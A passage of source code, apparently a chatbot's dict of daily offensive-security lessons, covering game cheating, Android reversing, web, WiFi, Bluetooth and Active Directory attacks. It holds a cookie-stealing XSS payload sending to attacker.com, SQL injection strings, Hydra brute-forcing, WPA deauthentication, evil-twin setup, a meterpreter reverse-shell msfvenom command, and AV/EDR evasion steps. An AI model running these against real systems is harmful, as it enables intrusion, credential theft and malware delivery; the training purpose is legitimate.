             "*📺 Suggested Videos:*\n"
             "- [🎥 How to Start a Cybersecurity Career (by John Hammond)](https://www.youtube.com/watch?v=fQx9p44YB4k)\n"
             "- [🎥 How I Became a Pentester (by The Cyber Mentor)](https://www.youtube.com/watch?v=9TjVIYZ1hHc)\n\n"

             "*✅ Final Outcome:*\n"
             "You are now:\n"
             "- Ready to take certifications like OSCP, PNPT, or CEH\n"
             "- Equipped with hands-on skills in offensive security\n"
             "- Capable of applying for internships, bug bounties, and cybersecurity jobs\n"
             "- A member of the global hacking community — keep learning, keep hacking! 💻⚡",

"day33": "*📅 Game Hacking Day 1: Cheat Engine Fundamentals*\n\n"
    "Cheat Engine is a powerful memory scanner for modifying offline PC games.\n"
    "It helps you locate variables like health, ammo, and scores and manipulate them live in RAM.\n\n"

    "*🧠 Topics Covered:*\n"
    "- How games store values in memory\n"
    "- Cheat Engine interface and process attachment\n"
    "- Exact value, unknown value, and pointer scans\n"
    "- Freezing and modifying memory values\n\n"

    "*🛠️ Practical Tasks:*\n"
    "1. Download & Install Cheat Engine: https://www.cheatengine.org/\n"
    "2. Open an offline game like Plants vs Zombies\n"
    "3. Attach the game process in Cheat Engine\n"
    "4. Scan current value (e.g., 50 sun), change it in-game, then scan again until 1 result\n"
    "5. Modify or freeze the value to test effect\n"
    "6. Use pointer scan to find persistent memory address\n\n"

    "*🎥 Suggested Videos:*\n"
    "- [Cheat Engine Beginner Tutorial](https://youtu.be/ZfWcfn5l8XQ)\n\n"

    "*✅ Outcome:*\n"
    "- Understand game memory and use Cheat Engine for real-time edits\n",

"day34": "*📅 Game Hacking Day 2: Android Game Hacking with Game Guardian*\n\n"
    "Game Guardian allows you to scan and change values in Android games.\n"
    "It requires a rooted device or a virtual environment like VMOS.\n\n"

    "*🧠 Topics Covered:*\n"
    "- Game Guardian installation and UI\n"
    "- Searching and filtering in-game values\n"
    "- Root vs rootless setup (Parallel Space/VMOS)\n\n"

    "*🛠️ Practical Tasks:*\n"
    "1. Install Game Guardian: https://gameguardian.net/download\n"
    "2. Use VMOS or Parallel Space to run it without root\n"
    "3. Launch GG with an offline Android game (e.g., Hill Climb Racing)\n"
    "4. Scan for fuel/coin value and change it\n"
    "5. Use encrypted/obfuscated value filters (e.g., XOR base)\n\n"

    "*🎥 Suggested Videos:*\n"
    "- [Game Guardian Basic Tutorial](https://youtu.be/ZfE7wMZqjGs)\n\n"

    "*✅ Outcome:*\n"
    "- Capable of scanning and modifying Android game memory safely\n",

"day35": "*📅 Game Hacking Day 3: Unity Game Modding*\n\n"
    "Many Android games are built with Unity and use `.dll` scripts for logic.\n"
    "You can decompile, modify, and recompile those using dnSpy.\n\n"

    "*🧠 Topics Covered:*\n"
    "- APK structure (assets, libs, smali, .dlls)\n"
    "- Unity games and `Assembly-CSharp.dll`\n"
    "- Editing .NET methods via dnSpy\n"
    "- Rebuilding and signing APK\n\n"

    "*🛠️ Practical Tasks:*\n"
    "1. Extract APK: `apktool d game.apk`\n"
    "2. Use MT Manager or jadx to locate `Assembly-CSharp.dll`\n"
    "3. Open DLL in dnSpy: https://github.com/dnSpy/dnSpy\n"
    "4. Modify game logic (e.g., always return true, unlimited coins)\n"
    "5. Save module, recompile APK using `apktool b`\n"
    "6. Sign with zipalign & apksigner\n\n"

    "*🎥 Suggested Videos:*\n"
    "- [Unity Modding with dnSpy](https://youtu.be/OZtPVK3x5zw)\n\n"

    "*✅ Outcome:*\n"
    "- Can patch Unity game DLLs and rebuild APK with custom logic\n",

"day36": "*📅 Game Hacking Day 4: Static Reverse Engineering (IDA / Ghidra)*\n\n"
    "You can analyze raw binary files of native games using IDA or Ghidra.\n"
    "These tools help you read low-level instructions and patch game logic.\n\n"

    "*🧠 Topics Covered:*\n"
    "- Difference between static and dynamic analysis\n"
    "- Analyzing `.exe`, `.so`, `.dll` files\n"
    "- Finding strings, functions, control flow\n"
    "- Replacing or patching instructions\n\n"

    "*🛠️ Practical Tasks:*\n"
    "1. Install IDA Free: https://hex-rays.com/ida-free\n"
    "2. Load game `.exe` or `.so` into IDA or Ghidra\n"
    "3. Navigate strings section to find UI text or logic markers\n"
    "4. Patch functions by replacing conditions (e.g., JE to JNE)\n"
    "5. Export binary and test the patched version\n\n"

    "*🎥 Suggested Videos:*\n"
    "- [IDA Basics for Beginners](https://youtu.be/9g60f9qNe24)\n\n"

    "*✅ Outcome:*\n"
    "- Able to disassemble and modify binary game logic using reverse engineering\n",

"day37": "*📅 Game Hacking Day 5: Dynamic Memory Patching with Frida*\n\n"
    "Frida is a powerful instrumentation toolkit that allows you to hook functions and modify app behavior at runtime.\n\n"

    "*🧠 Topics Covered:*\n"
    "- Introduction to Frida (dynamic hooking)\n"
    "- Frida CLI and Python scripting\n"
    "- Hooking Android/Windows processes\n\n"

    "*🛠️ Practical Tasks:*\n"
    "1. Install Frida and frida-server on Android (rooted or emulator)\n"
    "2. Attach Frida to a test app: `frida -U -n com.target.game`\n"
    "3. Hook a Java method and modify return value\n"
    "4. Write a Frida script to bypass checks or unlock premium features\n\n"
    "```javascript\n"
    "Java.perform(function() {\n"
    "  var GameClass = Java.use(\"com.target.game.Score\");\n"
    "  GameClass.getCoins.implementation = function() {\n"
    "    return 999999;\n"
    "  }\n"
    "});\n"
    "```\n\n"

    "*🎥 Suggested Videos:*\n"
    "- [Frida Dynamic Hooking](https://youtu.be/Kg2_0hTylLA)\n\n"

    "*✅ Outcome:*\n"
    "- Can inject and modify live game behavior using Frida scripts\n",

"day38": "*📅 Game Hacking Day 6: Building Trainers and Cheat Menus*\n\n"
    "Trainers are software utilities to control game memory externally.\n"
    "You’ll learn to build simple PC trainers and Android mod menus.\n\n"

    "*🧠 Topics Covered:*\n"
    "- What is a trainer and how it works\n"
    "- PC trainers using Python and C#\n"
    "- Android mod menu design\n\n"

    "*🛠️ Practical Tasks:*\n"
    "1. Use `pymem` in Python to build a simple trainer:\n"
    "```python\n"
    "from pymem import Pymem\n"
    "pm = Pymem('game.exe')\n"
    "address = pm.base_address + 0x123456\n"
    "pm.write_int(address, 999999)\n"
    "```\n"
    "2. Build a basic Tkinter GUI for toggling cheats\n"
    "3. For Android: use Unity mod menu framework to hook buttons\n\n"

    "*🎥 Suggested Videos:*\n"
    "- [Build Python Trainer](https://youtu.be/yDXgEiOYuF0)\n"
    "- [Android Mod Menu Tutorial](https://youtu.be/J6nKr8pOeEg)\n\n"

    "*✅ Outcome:*\n"
    "- Able to build basic trainers and in-game cheat UIs\n",

"day39": "*📅 Game Hacking Day 7: Ethics and Anti-Cheat Systems*\n\n"
    "Game hacking has strict boundaries. Today you’ll learn about responsible hacking and how anti-cheat systems work.\n\n"

    "*🧠 Topics Covered:*\n"
    "- Ethical vs unethical game hacking\n"
    "- Online cheating and consequences\n"
    "- Anti-cheat detection: VAC, EasyAntiCheat, BattlEye\n"
    "- Bypass methods and risks\n\n"

    "*🛠️ Practical Tasks:*\n"
    "1. Read case studies of real bans for hacking\n"
    "2. Analyze how games detect Cheat Engine or Frida\n"
    "3. Explore anti-debug and anti-hooking logic in games\n"
    "4. Create a checklist of ethical hacking rules\n\n"

    "*✅ Outcome:*\n"
    "- Understand what’s ethical, how anti-cheats work, and how to stay safe and legal\n",

"day40": "*📅 Mobile Hacking Day 1: Introduction to Android Hacking*\n\n"
    "Begin your journey by understanding how Android works under the hood.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Android security model vs iOS\n"
    "- APK structure: `classes.dex`, `AndroidManifest.xml`, `res/`, `lib/`\n"
    "- Android app components: Activities, Services, Broadcast Receivers\n"
    "- Permissions and sandboxing\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Install Android Studio or Genymotion\n"
    "2. Setup ADB: `sudo apt install adb` → connect emulator\n"
    "3. Install required tools:\n"
    "   ```bash\n"
    "   sudo apt install apktool jadx adb\n"
    "   ```\n"
    "4. Download a sample APK: `https://apkpure.com`\n"
    "5. Use `apktool d app.apk` to decompile\n"
    "6. Open `AndroidManifest.xml` and analyze permissions & activities\n\n"
    "*✅ Outcome:*\n"
    "- Understand APK file structure and Android application internals\n",

"day41": "*📅 Mobile Hacking Day 2: Static Analysis of APKs*\n\n"
    "Today you'll analyze an APK without running it, exploring its logic and behavior.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Static vs Dynamic Analysis\n"
    "- Tools: Apktool, jadx, MobSF\n"
    "- Reverse engineering DEX files\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use `jadx-gui` to decompile APK into Java code\n"
    "2. Explore logic in `MainActivity`, `LoginActivity`, etc.\n"
    "3. Look for hardcoded credentials or URLs\n"
    "4. Install MobSF: https://github.com/MobSF/Mobile-Security-Framework-MobSF\n"
    "5. Drag and drop APK to MobSF and analyze automatically\n\n"
    "*✅ Outcome:*\n"
    "- Able to read decompiled Java code and understand app behavior\n",

"day42": "*📅 Mobile Hacking Day 3: Dynamic Analysis & Frida Hooking*\n\n"
    "Interact with a live app at runtime and alter function responses with Frida.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is Frida?\n"
    "- Function hooking and instrumentation\n"
    "- Modifying Java methods at runtime\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Install Frida:\n"
    "   ```bash\n"
    "   pip install frida-tools\n"
    "   adb push frida-server /data/local/tmp && chmod +x frida-server\n"
    "   adb shell ./data/local/tmp/frida-server &\n"
    "   ```\n"
    "2. Hook running app:\n"
    "   ```bash\n"
    "   frida -U -n com.target.app\n"
    "   ```\n"
    "3. Inject script to override method:\n"
    "   ```javascript\n"
    "   Java.perform(function() {\n"
    "     var Login = Java.use(\"com.target.app.LoginActivity\");\n"
    "     Login.isAuthenticated.implementation = function() {\n"
    "       return true;\n"
    "     }\n"
    "   });\n"
    "   ```\n\n"
    "*✅ Outcome:*\n"
    "- You can modify behavior of apps without changing the APK\n",

"day43": "*📅 Mobile Hacking Day 4: APK Reversing and Modding*\n\n"
    "Disassemble, modify, and recompile APKs with altered behavior.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Smali basics\n"
    "- Modifying return values\n"
    "- Rebuilding and signing APKs\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Disassemble APK: `apktool d app.apk -o app_src`\n"
    "2. Edit logic in `smali/com/target/Login.smali`:\n"
    "   ```smali\n"
    "   .method public isAuthenticated()Z\n"
    "       .locals 1\n"
    "       const/4 v0, 0x1\n"
    "       return v0\n"
    "   .end method\n"
    "   ```\n"
    "3. Rebuild: `apktool b app_src -o modded.apk`\n"
    "4. Sign it:\n"
    "   ```bash\n"
    "   apksigner sign --ks mykey.keystore modded.apk\n"
    "   adb install modded.apk\n"
    "   ```\n\n"
    "*✅ Outcome:*\n"
    "- Can fully reverse, modify, and install tampered APKs\n",

"day44": "*📅 Mobile Hacking Day 5: Bypassing Root, SSL Pinning, and Debug Checks*\n\n"
    "Learn how to bypass common app protections using Frida and patching techniques.\n\n"
    "*🧠 Topics Covered:*\n"
    "- SSL pinning & how apps detect root/debugging\n"
    "- Frida SSL pinning bypass\n"
    "- Root detection patches\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use Frida script for SSL bypass:\n"
    "   ```bash\n"
    "   frida -U -n com.app --no-pause -l frida-ssl-unpinning.js\n"
    "   ```\n"
    "2. Patch root detection functions:\n"
    "   - Search smali for `isDeviceRooted()` → return false\n"
    "3. Use Xposed modules like RootCloak or SSLUnpinning\n\n"
    "*✅ Outcome:*\n"
    "- Able to bypass root detection, SSL pinning, and debug checks\n",

"day45": "*📅 Mobile Hacking Day 6: Mobile App Pentesting Framework (MobSF + Burp)\n\n"
    "Combine dynamic and static analysis with powerful automation.\n\n"
    "*🧠 Topics Covered:*\n"
    "- MobSF features and Burp Suite setup\n"
    "- Man-in-the-middle with custom certificates\n"
    "- Analyzing requests/responses in intercepted traffic\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Run MobSF docker:\n"
    "   ```bash\n"
    "   docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf\n"
    "   ```\n"
    "2. Configure Android emulator proxy to Burp: `10.0.2.2:8080`\n"
    "3. Install Burp CA in Android settings\n"
    "4. Analyze API requests, login credentials, and tokens\n\n"
    "*✅ Outcome:*\n"
    "- Able to inspect and manipulate app network traffic securely\n",

"day46": "*📅 Mobile Hacking Day 7: Advanced Attacks and Responsible Disclosure*\n\n"
    "Wrap up the module by simulating real attacks and learning how to report them ethically.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Exploiting leaked APIs, hardcoded credentials\n"
    "- Analyzing Firebase misconfigs, exposed keys\n"
    "- Responsible disclosure ethics\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Scan APKs for exposed Firebase URLs or keys\n"
    "2. Use tools like `apk-mitm` or `amass` for recon\n"
    "3. Identify bugs and write a sample report\n\n"
    "*✅ Outcome:*\n"
    "- Able to test apps end-to-end and prepare for bug bounty-style reports\n",

"day47": "*📅 Day 47: Introduction to Website Hacking*\n\n"
    "Start your web hacking journey by learning how web apps work and where they go wrong.\n\n"
    "*🧠 Topics Covered:*\n"
    "- HTTP/HTTPS protocols\n"
    "- Client vs Server architecture\n"
    "- OWASP Top 10 Web Vulnerabilities\n"
    "- Common web technologies (PHP, Node.js, Django)\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Visit `http://testphp.vulnweb.com`\n"
    "2. Use browser DevTools (F12) to inspect requests\n"
    "3. Install Burp Suite and intercept your own browser traffic\n"
    "4. Read OWASP Top 10 list: https://owasp.org/www-project-top-ten/\n\n"
    "*✅ Outcome:*\n"
    "- Understand web architecture and common vulnerabilities\n",

"day48": "*📅 Day 48: HTML & JavaScript Reconnaissance*\n\n"
    "Web apps often leak valuable data in source code. Let's find it!\n\n"
    "*🧠 Topics Covered:*\n"
    "- Viewing HTML/JS source code\n"
    "- Hidden inputs and JS variables\n"
    "- Robots.txt and exposed directories\n"
    "- Tools: Burp, dirb, gobuster\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. View-source on target site, look for:\n"
    "   - Hidden fields\n"
    "   - JavaScript API keys\n"
    "2. Run: `gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt`\n"
    "3. Check for `robots.txt`, `.git/`, `.env`, or backup files\n\n"
    "*✅ Outcome:*\n"
    "- Able to extract information and endpoints from frontend code\n",

"day49": "*📅 Day 49: Authentication Bypass Techniques*\n\n"
    "Crack poorly implemented login systems through logic flaws and tricks.\n\n"
    "*🧠 Topics Covered:*\n"
    "- SQL-based login bypass\n"
    "- Common default credentials\n"
    "- Session manipulation\n"
    "- Forgot-password abuse\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Try: `' OR '1'='1` in login fields (DVWA, bWAPP)\n"
    "2. Use Burp Suite to capture login request, modify params\n"
    "3. Try cookie tampering with `admin=true` or JWT manipulation\n"
    "4. Use `Hydra` for bruteforce:\n"
    "   ```bash\n"
    "   hydra -l admin -P rockyou.txt target.com http-post-form \"/login.php:username=^USER^&password=^PASS^:Invalid\"\n"
    "   ```\n\n"
    "*✅ Outcome:*\n"
    "- Can identify and test for weak authentication mechanisms\n",

"day50": "*📅 Day 50: SQL Injection (SQLi) Deep Dive*\n\n"
    "Time to manipulate databases and extract data using SQL injection.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Error-based, Union-based, and Blind SQLi\n"
    "- Database enumeration\n"
    "- Automating with sqlmap\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Manual test: `' OR 1=1 --`\n"
    "2. Try: `' UNION SELECT null, username, password FROM users --`\n"
    "3. Use sqlmap:\n"
    "   ```bash\n"
    "   sqlmap -u \"http://target.com/page.php?id=1\" --dbs\n"
    "   ```\n"
    "4. Extract tables & columns using `--dump`\n\n"
    "*✅ Outcome:*\n"
    "- Can detect, exploit, and automate SQL injection attacks\n",

"day51": "*📅 Day 51: XSS & DOM Injection*\n\n"
    "XSS allows you to inject malicious scripts into webpages. Time to pop some alerts!\n\n"
    "*🧠 Topics Covered:*\n"
    "- Reflected, Stored, DOM-based XSS\n"
    "- JavaScript injection basics\n"
    "- Common bypass techniques\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Inject: `<script>alert(1)</script>` in search forms\n"
    "2. Try cookie theft: `<script>location='http://attacker.com/?c='+document.cookie</script>`\n"
    "3. Use `XSS Hunter` for persistent payloads\n"
    "4. Inspect DOM-based inputs (`#fragment`, `document.URL`)\n\n"
    "*✅ Outcome:*\n"
    "- Able to identify and exploit various forms of XSS\n",

"day52": "*📅 Day 52: CSRF & Clickjacking Attacks*\n\n"
    "Force users to perform actions they didn’t intend to — with CSRF.\n\n"
    "*🧠 Topics Covered:*\n"
    "- CSRF theory and real-world examples\n"
    "- Anti-CSRF tokens and SameSite cookies\n"
    "- Clickjacking via iframe\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Setup a fake HTML form that submits onload:\n"
    "   ```html\n"
    "   <form action=\"http://target.com/change-password\" method=\"POST\">\n"
    "     <input type=\"hidden\" name=\"password\" value=\"hacked\">\n"
    "     <script>document.forms[0].submit()</script>\n"
    "   </form>\n"
    "   ```\n"
    "2. Load victim site in iframe:\n"
    "   ```html\n"
    "   <iframe src=\"http://target.com\" width=\"100%\" height=\"100%\"></iframe>\n"
    "   ```\n"
    "3. Observe if form submits silently\n\n"
    "*✅ Outcome:*\n"
    "- Understand CSRF impact and exploit potential\n",

"day53": "*📅 Day 53: IDOR & Business Logic Flaws*\n\n"
    "Go beyond the basics and abuse application logic and broken access control.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is Insecure Direct Object Reference (IDOR)?\n"
    "- Horizontal vs Vertical privilege escalation\n"
    "- Logic flaw exploitation\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Change user IDs in URLs: `GET /profile/1002`\n"
    "2. Try accessing others' invoices, data, or messages\n"
    "3. Abuse multi-step logic flows (e.g., checkout manipulation)\n"
    "4. Use Burp Repeater to test authorization enforcement\n\n"
    "*✅ Outcome:*\n"
    "- Can detect and exploit IDORs and flawed business logic\n",

"day54": "*📅 Day 54: Web CTF Labs & Bug Bounty Practice Platforms*\n\n"
    "Practice is key in mastering web hacking. Today you’ll explore platforms that offer real-world labs and challenges.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What are CTFs (Capture The Flag)\n"
    "- Differences: CTF vs Bug Bounty\n"
    "- Top platforms to practice legally\n"
    "- Report writing tips for bug bounties\n\n"
    "*🌐 Platforms to Explore:*\n"
    "- TryHackMe (Web Hacking Path)\n"
    "- HackTheBox (Starting Point & Web Challenges)\n"
    "- PortSwigger Academy (Free labs for all OWASP Top 10)\n"
    "- DVWA (Damn Vulnerable Web App)\n"
    "- Juice Shop by OWASP\n"
    "- HackThisSite.org\n"
    "- Root-Me.org (CTFs)\n"
    "- Hacker101 CTF by HackerOne\n"
    "- Bugcrowd University\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Create accounts on:\n"
    "   - https://tryhackme.com\n"
    "   - https://portswigger.net/web-security\n"
    "   - https://juice-shop.herokuapp.com\n\n"
    "2. Complete any 3 beginner-level challenges\n"
    "3. Write a mock bug bounty report with these sections:\n"
    "   - Summary\n"
    "   - Steps to Reproduce\n"
    "   - Impact\n"
    "   - Fix Recommendation\n\n"
    "*📝 Pro Tip:*\n"
    "- Keep a personal CTF log with your write-ups, solved flags, and code snippets.\n"
    "- Use GitHub Pages or Notion to showcase your progress in public.\n\n"
    "*✅ Outcome:*\n"
    "- You now have access to the best legal hacking labs online.\n"
    "- You’ve solved beginner CTFs and know how to write bug bounty reports.\n"
    "- You're on the path to becoming a skilled web hacker and bounty hunter.",


"day55": "*📅 Day 55: WiFi Basics & Monitor Mode*\n\n"
    "Today we explore how WiFi communication works and how to prepare your system for wireless hacking.\n\n"
    "*🧠 Topics Covered:*\n"
    "- 802.11 wireless protocol basics\n"
    "- WiFi encryption types: WEP, WPA, WPA2, WPA3\n"
    "- Difference between Managed, Monitor, and Promiscuous Modes\n"
    "- Required hardware: compatible wireless adapter (e.g., Alfa AWUS036NHA)\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Identify wireless interface:\n"
    "   ```bash\n"
    "   iwconfig\n"
    "   ```\n"
    "2. Enable monitor mode:\n"
    "   ```bash\n"
    "   airmon-ng start wlan0\n"
    "   ```\n"
    "3. Scan for nearby WiFi networks:\n"
    "   ```bash\n"
    "   airodump-ng wlan0mon\n"
    "   ```\n"
    "4. Stop monitor mode:\n"
    "   ```bash\n"
    "   airmon-ng stop wlan0mon\n"
    "   ```\n\n"
    "*🎥 Suggested Video:*\n"
    " [WiFi Hacking Intro](https://youtu.be/zR74zwcX-yo)\n\n"
    "*✅ Outcome:*\n"
    "- Understand how WiFi works and prepare your machine for packet capturing.",

"day56": "*📅 Day 56: WPA Handshake Capture & Cracking*\n\n"
    "Let's capture a WPA/WPA2 handshake and crack it using a wordlist.\n\n"
    "*🧠 Topics Covered:*\n"
    "- WPA handshake mechanism\n"
    "- Deauthentication attack\n"
    "- Dictionary attack basics\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Start monitor mode and scan WiFi:\n"
    "   ```bash\n"
    "   airodump-ng wlan0mon\n"
    "   ```\n"
    "2. Lock on to target WiFi:\n"
    "   ```bash\n"
    "   airodump-ng --bssid <router_bssid> -c <channel> -w capture wlan0mon\n"
    "   ```\n"
    "3. Deauth target client to force handshake:\n"
    "   ```bash\n"
    "   aireplay-ng --deauth 5 -a <router_bssid> -c <client_mac> wlan0mon\n"
    "   ```\n"
    "4. Crack captured handshake:\n"
    "   ```bash\n"
    "   aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt\n"
    "   ```\n\n"
    "*✅ Outcome:*\n"
    "- Able to capture WPA handshake and crack weak passwords using a dictionary file.",

"day57": "*📅 Day 57: Evil Twin Attack & WiFi MITM*\n\n"
    "Create fake access points to trick users and intercept their traffic.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Evil Twin Concept\n"
    "- DHCP spoofing\n"
    "- Captive portal phishing\n"
    "- MITM sniffing tools (Wireshark, sslstrip, mitmproxy)\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Create fake access point with airbase-ng:\n"
    "   ```bash\n"
    "   airbase-ng -e \"FreeWiFi\" -c 6 wlan0mon\n"
    "   ```\n"
    "2. Enable IP forwarding:\n"
    "   ```bash\n"
    "   echo 1 > /proc/sys/net/ipv4/ip_forward\n"
    "   ```\n"
    "3. Use `sslstrip` or `ettercap` to capture credentials\n"
    "4. Set up a captive portal using `fluxion` or `WiFi Pumpkin`\n\n"
    "*⚠️ Legal Warning:*\n"
    "- Only test in isolated labs. Never intercept or spoof public networks.\n\n"
    "*✅ Outcome:*\n"
    "- Able to create Evil Twin hotspots and simulate real-world MITM WiFi attacks.",

"day58": "*📅 Day 58: Bluetooth Protocols & Tools*\n\n"
    "Bluetooth is a short-range wireless protocol. Today you'll understand how it works and the tools used to hack it.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is Bluetooth (Classic vs BLE)\n"
    "- Bluetooth stack (HCI, L2CAP, RFCOMM)\n"
    "- Tools: `hcitool`, `bluetoothctl`, `l2ping`, `btmon`, `bluelog`\n"
    "- Bluetooth vulnerabilities (BlueBorne, BlueSnarfing, BlueBugging)\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. List Bluetooth devices:\n"
    "   ```bash\n"
    "   hcitool dev\n"
    "   ```\n"
    "2. Scan for discoverable devices:\n"
    "   ```bash\n"
    "   hcitool scan\n"
    "   ```\n"
    "3. Get device info:\n"
    "   ```bash\n"
    "   sdptool browse <device_mac>\n"
    "   ```\n"
    "4. Start a detailed monitor session:\n"
    "   ```bash\n"
    "   btmon\n"
    "   ```\n\n"
    "*✅ Outcome:*\n"
    "- Understand the structure of Bluetooth and begin basic recon using Linux tools.",

"day59": "*📅 Day 59: Bluetooth Device Scanning & Sniffing*\n\n"
    "Learn to detect and monitor Bluetooth traffic using specialized sniffing tools.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Discoverable vs Non-discoverable devices\n"
    "- Passive Bluetooth sniffing\n"
    "- MAC spoofing & signal strength analysis\n"
    "- Tools: `bluelog`, `bettercap`, `blue_hydra`, `ubertooth`\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Install and use Bluelog for live scanning:\n"
    "   ```bash\n"
    "   bluelog -i hci0 -v\n"
    "   ```\n"
    "2. Use bettercap Bluetooth module:\n"
    "   ```bash\n"
    "   sudo bettercap -eval \"ble.recon on; ble.show\"\n"
    "   ```\n"
    "3. Use `ubertooth` (if hardware available) for low-level BLE sniffing\n"
    "4. Record and analyze Bluetooth traffic using `btmon`\n\n"
    "*✅ Outcome:*\n"
    "- Able to discover, log, and analyze Bluetooth signals and behavior in your surroundings.",

    "day60": "*📅 Day 60: Bluetooth Exploitation & Payloads*\n\n"
    "Explore how to exploit Bluetooth vulnerabilities using tools and payloads.\n\n"
    "*🧠 Topics Covered:*\n"
    "- BlueSnarfing (data theft)\n"
    "- BlueBugging (remote command access)\n"
    "- CVEs like BlueBorne & BLESA\n"
    "- Tools: `bluesnarfer`, `spooftooph`, `Metasploit Bluetooth modules`\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Run BlueSnarf attack (lab only):\n"
    "   ```bash\n"
    "   bluesnarfer -r 1-50 -b <target_mac>\n"
    "   ```\n"
    "2. Clone a Bluetooth MAC address:\n"
    "   ```bash\n"
    "   spooftooph -i hci0 -n \"TargetName\" -a <target_mac>\n"
    "   ```\n"
    "3. Launch BlueBorne exploit using Metasploit:\n"
    "   ```bash\n"
    "   use exploit/linux/bluetooth/blueborne\n"
    "   ```\n"
    "4. Setup rogue Bluetooth devices to test phishing over BLE\n\n"
    "*⚠️ Legal Warning:*\n"
    "- Only test against your own devices or approved labs.\n\n"
    "*✅ Outcome:*\n"
    "- Able to exploit weak Bluetooth configurations and test real-world vulnerabilities.",

"day61": "*📅 Day 61: CrackMapExec & Active Directory Enumeration*\n\n"
    "Today we enter the world of Active Directory (AD) enumeration — the heart of internal network attacks.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is Active Directory & why it matters\n"
    "- CrackMapExec (CME) Overview\n"
    "- SMB, LDAP, user/group/share enumeration\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Install CME:\n"
    "   ```bash\n"
    "   pip install crackmapexec\n"
    "   ```\n"
    "2. Scan network shares:\n"
    "   ```bash\n"
    "   cme smb 192.168.1.0/24 --shares\n"
    "   ```\n"
    "3. Enumerate users & groups:\n"
    "   ```bash\n"
    "   cme smb target_ip -u '' -p '' --users\n"
    "   ```\n\n"
    "*✅ Outcome:*\n"
    "- You can enumerate AD users, groups, and shares using CME silently.",

"day62": "*📅 Day 62: Lateral Movement Techniques*\n\n"
    "Compromising one machine is not enough — learn how to pivot inside a network.\n\n"
    "*🧠 Topics Covered:*\n"
    "- PsExec, WMIExec, SMBExec tools (Impacket)\n"
    "- Reusing credentials and tokens\n"
    "- Avoiding detection during lateral movement\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Setup Impacket tools:\n"
    "   ```bash\n"
    "   git clone https://github.com/fortra/impacket\n"
    "   cd impacket && pip install .\n"
    "   ```\n"
    "2. Use PsExec:\n"
    "   ```bash\n"
    "   python3 examples/psexec.py admin@target\n"
    "   ```\n"
    "3. Try WMIExec & SMBExec with known credentials\n\n"
    "*✅ Outcome:*\n"
    "- You understand multiple ways to move laterally within networks.",

"day63": "*📅 Day 63: Custom Payload Development*\n\n"
    "Learn how to build payloads that bypass static signature detection.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Shellcode generation with `msfvenom`\n"
    "- Wrapping shellcode in C, Python, or Go\n"
    "- AV/EDR evasion tricks (e.g., XOR, base64, sleep)\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Generate payload:\n"
    "   ```bash\n"
    "   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f c > payload.c\n"
    "   ```\n"
    "2. Compile with mingw-w64 or embed in Go script\n"
    "3. Test payload in isolated VM with antivirus\n\n"
    "*✅ Outcome:*\n"
    "- Able to craft and compile custom payloads manually.",

"day64": "*📅 Day 64: Antivirus & EDR Evasion*\n\n"
    "Antivirus and EDR solutions are smarter — let’s learn how to slip past them.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Common detection methods (signatures, behaviors)\n"
    "- Obfuscation: encryption, packers, encoding\n"
    "- Using loaders & crypters\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use Veil:\n"
    "   ```bash\n"
    "   git clone https://github.com/Veil-Framework/Veil.git\n"
    "   ./Veil/setup.sh && ./Veil/Veil.py\n"
    "   ```\n"
    "2. Encode shellcode using Donut or sRDI\n"
    "3. Bypass Defender using Nim loader or PowerShell\n\n"
    "*✅ Outcome:*\n"
    "- Able to test and bypass basic AV/EDR with obfuscation and loaders.",

"day65": "*📅 Day 65: Initial Access Techniques*\n\n"
    "Initial access is how attackers enter a network — often using social engineering.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Malicious Office macros, HTA files, and LNK shortcuts\n"
    "- Hosting payloads on web servers\n"
    "- Fake update and drive-by attacks\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Create malicious document:\n"
    "   ```bash\n"
    "   macro_pack.exe -f file.docm -e CMD -o -G payload\n"
    "   ```\n"
    "2. Host using Python server:\n"
    "   ```bash\n"
    "   python3 -m http.server 8080\n"
    "   ```\n"
    "3. Combine with msfvenom or C2 payload\n\n"
    "*✅ Outcome:*\n"
    "- You know how attackers gain access via crafted documents and social tricks.",

"day66": "*📅 Day 66: C2 Channels & Persistence*\n\n"
    "Learn to maintain access using Command and Control (C2) frameworks.\n\n"
